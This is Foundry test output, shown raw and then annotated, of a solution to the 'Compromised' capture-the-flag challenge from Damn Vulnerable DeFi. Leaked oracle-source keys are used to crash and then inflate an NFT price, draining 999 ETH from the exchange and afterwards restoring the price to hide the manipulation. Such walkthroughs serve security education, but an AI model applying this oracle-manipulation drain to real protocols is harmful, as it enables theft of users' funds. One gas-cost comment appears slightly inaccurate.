forge test --match-path test/compromised/Compromised.t.sol -vvvv
[⠒] Compiling...
[⠑] Compiling 18 files with Solc 0.8.25
[⠘] Solc 0.8.25 finished in 7.53s
Compiler run successful!

Ran 2 tests for test/compromised/Compromised.t.sol:CompromisedChallenge
[PASS] test_assertInitialState() (gas: 40706)
Traces:
  [40706] CompromisedChallenge::test_assertInitialState()
    ├─ [0] VM::assertEq(2000000000000000000 [2e18], 2000000000000000000 [2e18]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(2000000000000000000 [2e18], 2000000000000000000 [2e18]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(2000000000000000000 [2e18], 2000000000000000000 [2e18]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(100000000000000000 [1e17], 100000000000000000 [1e17]) [staticcall]
    │   └─ ← [Return]
    ├─ [2382] DamnValuableNFT::owner() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [0] VM::assertEq(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return]
    ├─ [2609] DamnValuableNFT::rolesOf(Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [305] DamnValuableNFT::MINTER_ROLE() [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

[PASS] test_compromised() (gas: 243200)
Traces:
  [309266] CompromisedChallenge::test_compromised()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x188Ea627E3531Db590e6f1D71ED83628d1933088
    ├─ [0] VM::startPrank(0x188Ea627E3531Db590e6f1D71ED83628d1933088)
    │   └─ ← [Return]
    ├─ [10931] TrustfulOracle::postPrice("DVNFT", 0)
    │   ├─ emit UpdatedPrice(source: 0x188Ea627E3531Db590e6f1D71ED83628d1933088, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 999000000000000000000 [9.99e20], newPrice: 0)
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
    ├─ [0] VM::startPrank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8)
    │   └─ ← [Return]
    ├─ [10931] TrustfulOracle::postPrice("DVNFT", 0)
    │   ├─ emit UpdatedPrice(source: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 999000000000000000000 [9.99e20], newPrice: 0)
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [108413] Exchange::buyOne{value: 1}()
    │   ├─ [3218] DamnValuableNFT::symbol() [staticcall]
    │   │   └─ ← [Return] "DVNFT"
    │   ├─ [14981] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [72069] DamnValuableNFT::safeMint(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], tokenId: 0)
    │   │   └─ ← [Return] 0
    │   ├─ [0] player::fallback{value: 1}()
    │   │   └─ ← [Stop]
    │   ├─ emit TokenBought(buyer: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], tokenId: 0, price: 0)
    │   └─ ← [Return] 0
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x188Ea627E3531Db590e6f1D71ED83628d1933088
    ├─ [0] VM::startPrank(0x188Ea627E3531Db590e6f1D71ED83628d1933088)
    │   └─ ← [Return]
    ├─ [4131] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
    │   ├─ emit UpdatedPrice(source: 0x188Ea627E3531Db590e6f1D71ED83628d1933088, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 0, newPrice: 999000000000000000000 [9.99e20])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
    ├─ [0] VM::startPrank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8)
    │   └─ ← [Return]
    ├─ [4131] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
    │   ├─ emit UpdatedPrice(source: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 0, newPrice: 999000000000000000000 [9.99e20])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [25070] DamnValuableNFT::approve(Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0)
    │   ├─ emit Approval(owner: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], approved: Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [55367] Exchange::sellOne(0)
    │   ├─ [617] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   └─ ← [Return] player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]
    │   ├─ [840] DamnValuableNFT::getApproved(0) [staticcall]
    │   │   └─ ← [Return] Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]
    │   ├─ [1218] DamnValuableNFT::symbol() [staticcall]
    │   │   └─ ← [Return] "DVNFT"
    │   ├─ [4981] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
    │   │   └─ ← [Return] 999000000000000000000 [9.99e20]
    │   ├─ [28841] DamnValuableNFT::transferFrom(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0)
    │   │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], tokenId: 0)
    │   │   └─ ← [Stop]
    │   ├─ [3837] DamnValuableNFT::burn(0)
    │   │   ├─ emit Transfer(from: Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: 0x0000000000000000000000000000000000000000, tokenId: 0)
    │   │   └─ ← [Stop]
    │   ├─ [0] player::fallback{value: 999000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ emit TokenSold(seller: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], tokenId: 0, price: 999000000000000000000 [9.99e20])
    │   └─ ← [Stop]
    ├─ [0] recovery::fallback{value: 999000000000000000000}()
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x188Ea627E3531Db590e6f1D71ED83628d1933088
    ├─ [0] VM::startPrank(0x188Ea627E3531Db590e6f1D71ED83628d1933088)
    │   └─ ← [Return]
    ├─ [4131] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
    │   ├─ emit UpdatedPrice(source: 0x188Ea627E3531Db590e6f1D71ED83628d1933088, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 999000000000000000000 [9.99e20], newPrice: 999000000000000000000 [9.99e20])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
    ├─ [0] VM::startPrank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8)
    │   └─ ← [Return]
    ├─ [4131] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
    │   ├─ emit UpdatedPrice(source: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 999000000000000000000 [9.99e20], newPrice: 999000000000000000000 [9.99e20])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]
    │   └─ ← [Return]
    ├─ [675] DamnValuableNFT::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [4981] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
    │   └─ ← [Return] 999000000000000000000 [9.99e20]
    ├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 13.28ms (7.96ms CPU time)

Ran 1 test suite in 64.66ms (13.28ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)

forge test --match-path test/compromised/Compromised.t.sol -vvvv

# ─────────────────────────────────────────────────────────────────────────────
# COMPILATION
# Forge compiles only changed files (incremental build).
# 18 files needed recompilation with Solc 0.8.25 (took 7.53s).
# "Compiler run successful!" — no type errors, no missing imports.
# ─────────────────────────────────────────────────────────────────────────────
[⠒] Compiling...
[⠑] Compiling 18 files with Solc 0.8.25
[⠘] Solc 0.8.25 finished in 7.53s
Compiler run successful!

# ─────────────────────────────────────────────────────────────────────────────
# TEST SUITE SUMMARY
# Both tests inside CompromisedChallenge ran. Both passed.
# ─────────────────────────────────────────────────────────────────────────────
Ran 2 tests for test/compromised/Compromised.t.sol:CompromisedChallenge

# ═════════════════════════════════════════════════════════════════════════════
# TEST 1: test_assertInitialState()
# Purpose: Verify deployment preconditions before any exploit runs.
# Gas used: 40,706 — cheap because it's all staticcalls (no state changes).
# Result: PASS ✓
# ═════════════════════════════════════════════════════════════════════════════
[PASS] test_assertInitialState() (gas: 40706)
Traces:
  [40706] CompromisedChallenge::test_assertInitialState()

    # ── Oracle source balances ────────────────────────────────────────────────
    # Each of the 3 trusted sources was pre-funded with exactly 2 ETH (2e18 wei)
    # so they can afford gas when calling postPrice() during the exploit.
    ├─ [0] VM::assertEq(2000000000000000000 [2e18], 2000000000000000000 [2e18]) [staticcall]
    │   └─ ← [Return]   # sources[0] balance == 2 ETH ✓
    ├─ [0] VM::assertEq(2000000000000000000 [2e18], 2000000000000000000 [2e18]) [staticcall]
    │   └─ ← [Return]   # sources[1] balance == 2 ETH ✓
    ├─ [0] VM::assertEq(2000000000000000000 [2e18], 2000000000000000000 [2e18]) [staticcall]
    │   └─ ← [Return]   # sources[2] balance == 2 ETH ✓

    # ── Player balance ────────────────────────────────────────────────────────
    # Player starts with only 0.1 ETH (1e17 wei) — far below the 999 ETH NFT price.
    # This constraint forces the attacker to manipulate the oracle rather than
    # simply buying an NFT at the honest price.
    ├─ [0] VM::assertEq(100000000000000000 [1e17], 100000000000000000 [1e17]) [staticcall]
    │   └─ ← [Return]   # player.balance == 0.1 ETH ✓

    # ── NFT ownership ─────────────────────────────────────────────────────────
    # DamnValuableNFT.owner() returns address(0) because the Exchange called
    # token.renounceOwnership() in its constructor immediately after deployment.
    # No single party can mint NFTs directly — only the Exchange can (via MINTER_ROLE).
    ├─ [2382] DamnValuableNFT::owner() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [0] VM::assertEq(0x000...0000, 0x000...0000) [staticcall]
    │   └─ ← [Return]   # NFT owner == address(0) (renounced) ✓

    # ── Exchange minting rights ───────────────────────────────────────────────
    # rolesOf(exchange) returns a bitmask. MINTER_ROLE = 1 (bit 0).
    # The Exchange holds MINTER_ROLE so it can call safeMint() inside buyOne().
    # No other address has this role — the NFT supply is entirely exchange-controlled.
    ├─ [2609] DamnValuableNFT::rolesOf(Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 1  # bitmask: MINTER_ROLE bit is set
    ├─ [305] DamnValuableNFT::MINTER_ROLE() [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1) [staticcall]
    │   └─ ← [Return]   # Exchange has MINTER_ROLE ✓
    └─ ← [Stop]


# ═════════════════════════════════════════════════════════════════════════════
# TEST 2: test_compromised()
# Purpose: Full exploit — drain 999 ETH from the Exchange via oracle manipulation.
# Gas used: 243,200 — higher due to state-changing oracle posts, mint, approve, sell.
# Result: PASS ✓
# ═════════════════════════════════════════════════════════════════════════════
[PASS] test_compromised() (gas: 243200)
Traces:
  [309266] CompromisedChallenge::test_compromised()
  # Note: 309,266 gas measured at call entry (includes all sub-calls);
  #       243,200 is the net gas reported after refunds.

  # ── STEP 1A: Crash price — sources[0] posts 0 ────────────────────────────
  # vm.addr(privateKey1) confirms the recovered key maps to sources[0].
  # This is the cryptographic proof that the leak gave us this address's key.
  ├─ [0] VM::addr(<pk>) [staticcall]
  │   └─ ← [Return] 0x188Ea627E3531Db590e6f1D71ED83628d1933088  # == sources[0] ✓
  ├─ [0] VM::startPrank(0x188Ea627...)   # Impersonate sources[0]
  │   └─ ← [Return]
  ├─ [10931] TrustfulOracle::postPrice("DVNFT", 0)
  │   # UpdatedPrice event confirms: oldPrice=999e18, newPrice=0
  │   # sources[0]'s stored price is now 0.
  │   # Current prices across all sources: [0, 999e18, 999e18]
  │   # Median (index 1 of sorted [0, 999e18, 999e18]) = 999e18 — not enough yet.
  │   ├─ emit UpdatedPrice(source: 0x188Ea627..., oldPrice: 999e18, newPrice: 0)
  │   └─ ← [Stop]
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]

  # ── STEP 1B: Crash price — sources[1] posts 0 ────────────────────────────
  # Now both compromised sources report 0.
  # Sorted prices: [0, 0, 999e18] → median = index[1] = 0.
  # The Exchange will now sell NFTs for 0 ETH.
  ├─ [0] VM::addr(<pk>) [staticcall]
  │   └─ ← [Return] 0xA417D473...  # == sources[1] ✓
  ├─ [0] VM::startPrank(0xA417D473...)
  │   └─ ← [Return]
  ├─ [10931] TrustfulOracle::postPrice("DVNFT", 0)
  │   # oldPrice=999e18, newPrice=0
  │   # Current prices: [0, 0, 999e18] → median = 0 ✓
  │   ├─ emit UpdatedPrice(source: 0xA417D473..., oldPrice: 999e18, newPrice: 0)
  │   └─ ← [Stop]
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]

  # ── STEP 2: Buy NFT for 1 wei ─────────────────────────────────────────────
  # Exchange.buyOne() rejects msg.value == 0, so we send 1 wei minimum.
  # Oracle returns 0, so price = 0. Change = msg.value - price = 1 - 0 = 1 wei refunded.
  # Net cost to player = 0 ETH. Player receives tokenId = 0.
  ├─ [0] VM::startPrank(player: [0x44E97aF4...])
  │   └─ ← [Return]
  ├─ [108413] Exchange::buyOne{value: 1}()
  │   ├─ [3218] DamnValuableNFT::symbol() [staticcall]
  │   │   └─ ← [Return] "DVNFT"
  │   ├─ [14981] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
  │   │   └─ ← [Return] 0   # Median confirmed as 0 — crash worked ✓
  │   # safeMint allocates tokenId=0 (first ever mint) and transfers it to player
  │   ├─ [72069] DamnValuableNFT::safeMint(player: [0x44E97aF4...])
  │   │   ├─ emit Transfer(from: 0x0...0, to: player, tokenId: 0)  # Minted ✓
  │   │   └─ ← [Return] 0
  │   # Refund: 1 wei change sent back to player (msg.value - price = 1 - 0 = 1)
  │   ├─ [0] player::fallback{value: 1}()
  │   │   └─ ← [Stop]   # Player's EOA fallback accepts the 1 wei refund
  │   ├─ emit TokenBought(buyer: player, tokenId: 0, price: 0)  # Bought for free ✓
  │   └─ ← [Return] 0   # Returns tokenId = 0
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]

  # ── STEP 3A: Inflate price — sources[0] posts 999 ETH ────────────────────
  # Both compromised sources now report EXCHANGE_INITIAL_ETH_BALANCE (999e18).
  # This will make the median = 999 ETH so the Exchange pays us in full when we sell.
  ├─ [0] VM::addr(<pk>) [staticcall]
  │   └─ ← [Return] 0x188Ea627...
  ├─ [0] VM::startPrank(0x188Ea627...)
  │   └─ ← [Return]
  ├─ [4131] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
  │   # Note gas dropped from 10,931 → 4,131: updating a non-zero→non-zero slot
  │   # is cheaper than zero→non-zero (cold SSTORE vs warm SSTORE in EIP-2929).
  │   ├─ emit UpdatedPrice(source: 0x188Ea627..., oldPrice: 0, newPrice: 999e18)
  │   └─ ← [Stop]
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]

  # ── STEP 3B: Inflate price — sources[1] posts 999 ETH ────────────────────
  # Now: sources = [999e18, 999e18, 999e18]
  # Sorted: [999e18, 999e18, 999e18] → median = 999 ether ✓
  ├─ [0] VM::addr(<pk>) [staticcall]
  │   └─ ← [Return] 0xA417D473...
  ├─ [0] VM::startPrank(0xA417D473...)
  │   └─ ← [Return]
  ├─ [4131] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
  │   ├─ emit UpdatedPrice(source: 0xA417D473..., oldPrice: 0, newPrice: 999e18)
  │   └─ ← [Stop]
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]

  # ── STEP 4: Sell NFT back — drain 999 ETH from Exchange ──────────────────
  ├─ [0] VM::startPrank(player: [0x44E97aF4...])
  │   └─ ← [Return]

  # approve() grants Exchange permission to call transferFrom() on tokenId=0.
  # Without this, Exchange.sellOne() would revert with TransferNotApproved.
  ├─ [25070] DamnValuableNFT::approve(Exchange: [0x1240FA2A...], 0)
  │   ├─ emit Approval(owner: player, approved: Exchange, tokenId: 0)
  │   └─ ← [Stop]

  ├─ [55367] Exchange::sellOne(0)
  │   # Guard 1: Verify caller is the NFT owner
  │   ├─ [617] DamnValuableNFT::ownerOf(0) [staticcall]
  │   │   └─ ← [Return] player  # player owns tokenId=0 ✓
  │   # Guard 2: Verify Exchange is approved to move the NFT
  │   ├─ [840] DamnValuableNFT::getApproved(0) [staticcall]
  │   │   └─ ← [Return] Exchange  # approved ✓
  │   ├─ [1218] DamnValuableNFT::symbol() [staticcall]
  │   │   └─ ← [Return] "DVNFT"
  │   # Guard 3: Fetch current median — must equal what Exchange can afford
  │   ├─ [4981] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
  │   │   └─ ← [Return] 999000000000000000000 [9.99e20]  # Inflated price confirmed ✓
  │   # Pull NFT from player into Exchange (Exchange is approved, so this succeeds)
  │   ├─ [28841] DamnValuableNFT::transferFrom(player, Exchange, 0)
  │   │   ├─ emit Transfer(from: player, to: Exchange, tokenId: 0)
  │   │   └─ ← [Stop]
  │   # Permanently destroy the NFT — it can never be re-sold
  │   ├─ [3837] DamnValuableNFT::burn(0)
  │   │   ├─ emit Transfer(from: Exchange, to: 0x0...0, tokenId: 0)  # Burned ✓
  │   │   └─ ← [Stop]
  │   # Pay player 999 ETH — this fully drains the Exchange (had exactly 999 ETH)
  │   ├─ [0] player::fallback{value: 999000000000000000000}()
  │   │   └─ ← [Stop]   # Player's EOA receives 999 ETH ✓
  │   ├─ emit TokenSold(seller: player, tokenId: 0, price: 999e18)
  │   └─ ← [Stop]

  # ── STEP 5: Forward 999 ETH to recovery address ──────────────────────────
  # player.transfer() sends exactly EXCHANGE_INITIAL_ETH_BALANCE to recovery.
  # recovery is a plain EOA — its fallback accepts the ETH silently.
  ├─ [0] recovery::fallback{value: 999000000000000000000}()
  │   └─ ← [Stop]   # recovery now holds 999 ETH ✓
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]

  # ── STEP 6A: Restore oracle — sources[0] posts 999 ETH ───────────────────
  # _isSolved() asserts oracle.getMedianPrice("DVNFT") == 999 ether.
  # Since Step 3 already set both sources to 999e18, these calls are technically
  # redundant — but explicit restoration makes the intent clear.
  # Notice: oldPrice == newPrice == 999e18 (no actual change in state here).
  ├─ [0] VM::addr(<pk>) [staticcall]
  │   └─ ← [Return] 0x188Ea627...
  ├─ [0] VM::startPrank(0x188Ea627...)
  │   └─ ← [Return]
  ├─ [4131] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
  │   ├─ emit UpdatedPrice(source: 0x188Ea627..., oldPrice: 999e18, newPrice: 999e18)
  │   └─ ← [Stop]   # No state change — price was already 999e18 after Step 3
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]

  # ── STEP 6B: Restore oracle — sources[1] posts 999 ETH ───────────────────
  ├─ [0] VM::addr(<pk>) [staticcall]
  │   └─ ← [Return] 0xA417D473...
  ├─ [0] VM::startPrank(0xA417D473...)
  │   └─ ← [Return]
  ├─ [4131] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
  │   ├─ emit UpdatedPrice(source: 0xA417D473..., oldPrice: 999e18, newPrice: 999e18)
  │   └─ ← [Stop]   # No state change — already 999e18
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]

  # ── _isSolved() — Win Condition Checks ───────────────────────────────────
  # Called automatically by the checkSolved modifier after test_compromised() returns.

  # Check 1: Exchange has been fully drained
  ├─ [0] VM::assertEq(0, 0) [staticcall]
  │   └─ ← [Return]   # exchange.balance == 0 ✓

  # Check 2: Recovery address holds exactly 999 ETH
  ├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]
  │   └─ ← [Return]   # recovery.balance == 999 ETH ✓

  # Check 3: Player holds no NFTs (tokenId=0 was burned during sellOne)
  ├─ [675] DamnValuableNFT::balanceOf(player: [0x44E97aF4...]) [staticcall]
  │   └─ ← [Return] 0
  ├─ [0] VM::assertEq(0, 0) [staticcall]
  │   └─ ← [Return]   # nft.balanceOf(player) == 0 ✓

  # Check 4: Oracle price is restored — system appears unaffected to outside observers
  ├─ [4981] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
  │   └─ ← [Return] 999000000000000000000 [9.99e20]
  ├─ [0] VM::assertEq(999e18, 999e18) [staticcall]
  │   └─ ← [Return]   # oracle.getMedianPrice("DVNFT") == 999 ETH ✓
  └─ ← [Stop]

# ─────────────────────────────────────────────────────────────────────────────
# FINAL RESULTS
# Suite result: ok — no failures, no skipped tests.
# Wall time: 64.66ms total | 13.28ms for the test run | 7.96ms CPU time
# 2/2 tests passed. Challenge solved. ✓
# ─────────────────────────────────────────────────────────────────────────────
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 13.28ms (7.96ms CPU time)
Ran 1 test suite in 64.66ms (13.28ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
